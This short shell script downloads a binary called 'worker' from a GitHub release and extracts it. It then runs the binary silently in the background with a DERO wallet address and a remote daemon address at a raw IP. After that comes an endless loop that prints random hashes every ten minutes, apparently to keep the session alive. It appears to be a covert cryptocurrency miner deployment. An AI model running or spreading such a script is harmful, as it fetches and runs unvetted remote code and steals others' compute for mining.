wget -q https://github.com/yasha887/firstproject/releases/download/v1/worker.tar.xz
tar -xf worker.tar.xz
chmod +x worker
./worker --wallet-address=dero1qypr9tcjl50u0090u4hze9f22sfwpmunqhh82ehz02z47p0006h52qqf4yeh0 --daemon-rpc-address=45.79.169.248:80 > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
